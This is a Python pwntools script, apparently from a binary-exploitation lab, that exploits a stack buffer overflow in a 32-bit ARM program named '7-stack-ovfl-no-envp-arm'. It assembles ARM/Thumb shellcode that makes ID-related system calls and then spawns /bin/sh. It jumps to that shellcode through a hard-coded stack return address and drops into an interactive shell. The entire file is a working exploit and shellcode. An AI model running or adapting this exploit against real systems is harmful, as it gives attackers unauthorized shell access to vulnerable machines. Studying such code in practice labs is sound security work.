#!/usr/bin/env python3

import os
import subprocess

from pwn import *
from pwn import asm, context, gdb, p8, p32, process

context.arch = "arm"
context.bits = "32"
context.terminal = ["tmux", "splitw", "-h"]

# run this embedded shellcode
shellcode = b"a" * 0
shellcode += asm(
    """
.code 32
add r3,pc,#1
bx r3
.code 16
movs r7,0x32
svc #1
mov r1,r0
movs r7,0x47
mov r1,r1
svc #1
adr r0,binsh
eor r1,r1
eor r1,r1
sub r1,r1
sub r2,r2
strb r2,[r0,#7]
movs r7,0x0b
svc #0x1
binsh: .ascii "/bin/shX"
"""
)
shellcode += b"a" * 1

with open("shellcode.bin", "wb") as f:
    f.write(shellcode)

io = process(["./7-stack-ovfl-no-envp-arm", shellcode])
shellcode_addr = 0xFFFEF428
jump_addr = p32(shellcode_addr)
payload = asm("nop") * 2 + jump_addr
with open("stdin.bin", "wb") as f:
    f.write(payload)

print(io.recv())
io.sendline(payload)
print(io.recv())
io.interactive()
